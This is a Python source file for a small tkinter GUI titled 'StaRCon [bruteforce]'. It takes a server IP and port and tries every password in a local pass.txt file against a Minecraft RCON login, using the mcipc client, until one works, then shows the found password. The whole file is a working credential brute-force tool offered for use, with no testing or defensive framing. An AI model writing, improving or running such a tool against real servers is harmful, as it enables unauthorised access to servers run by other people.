

from tkinter import Entry
from tkinter import Text
from tkinter import Button
from tkinter import Label
from mcipc.rcon import Client
import tkinter as tk
from tkinter import messagebox as mb
import threading

root = tk.Tk()

root.resizable(width = False, height = False)
root.iconbitmap("rconico.ico")
root.geometry("406x500")
root.title("StaRCon [bruteforce]")
root['bg'] = "#141414"

mystring1 = tk.StringVar(root)
mystring2 = tk.IntVar(root)


def check():
	
	ip = mystring1.get()
	port = mystring2.get()
	
	
	with Client(ip, port) as client:
		password = open("pass.txt", "r")
		

		for i in password:
			
			
			try:
				i2 = i.replace("\n", "")
				client.login(i2)
				logs.insert("insert", "Connect: " + i)
				mb.showinfo("Done!", "Password is: " + i)
				break
				
			except:
				logs.insert("insert", "Error: " +  i)
	




t = threading.Thread(target = check, name = 'Thread')


def mainstart():
	t.start()


ip = Entry(
	textvariable = mystring1,
	width=35,
	fg='#8ed41e',
	bd=5,
	bg='#383738',
	font = 15,
	justify = 'center')


port = Entry(
	textvariable = mystring2,
	width=35,
	fg='#8ed41e',
	bd=5,
	bg='#383738',
	font = 15,
	justify = 'center')


Text1 = tk.Label(
	text = 'ip', 
	font = ("Segoe Script", "15"),
	bg = '#1c0f1a',
	fg = '#37e827')


Text2 = tk.Label(
	text = 'port', 
	font = ("Segoe Script", "15"),
	bg = '#1c0f1a',
	fg = '#37e827')


start = tk.Button(
	text='start',
	font = ("", "13"),
	fg='#0dfc35', 
	bg='#8f9c0b',
	height = 2,
	width = 15,
	command=mainstart,)

logs = tk.Text(
	fg = '#fc12d5',
	bg = "#0d0d0d",
	height = 21,
	width = 36,
	wrap = 'word',
	font = 15 )

def clear():
	
	


	for num2 in range(20):
		num2=num2+1
		ip.delete(0,)



Text1.pack()
ip.pack()
Text2.pack()
port.pack()
start.pack()
logs.pack()

root.mainloop()
